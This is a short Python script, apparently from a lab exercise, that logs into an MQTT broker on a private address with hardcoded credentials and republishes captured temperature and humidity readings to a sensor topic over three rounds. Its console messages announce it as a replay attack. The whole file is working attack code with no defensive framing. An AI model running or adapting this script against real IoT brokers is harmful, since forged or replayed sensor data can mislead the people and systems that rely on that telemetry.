import paho.mqtt.client as mqtt
import time

BROKER = "192.168.35.143"
PORT = 1883
TOPIC = "sensors/telemetry"

replayed_payloads = [
    '{"temperature": 23.41, "humidity": 48.85}',
    '{"temperature": 24.65, "humidity": 54.84}',
    '{"temperature": 22.13, "humidity": 51.20}',
    '{"temperature": 25.87, "humidity": 49.33}',
    '{"temperature": 21.95, "humidity": 52.76}',
]

client = mqtt.Client()
client.username_pw_set("legituser", "password123")
client.connect(BROKER, PORT, 60)
client.loop_start()

print("[*] Starting MQTT Replay Attack")
print("[*] Re-injecting previously captured sensor payloads...")

for round_num in range(1, 4):
    print(f"\n[*] === Replay Round {round_num}/3 ===")
    for payload in replayed_payloads:
        client.publish(TOPIC, payload, qos=1)
        print(f"    Replayed: {payload}")
        time.sleep(1)
    print(f"[*] Round {round_num} complete — 5 packets sent")
    print(f"[*] Waiting 5 seconds...")
    time.sleep(5)

client.loop_stop()
print("\n[*] Replay attack complete — broker accepted all replayed messages")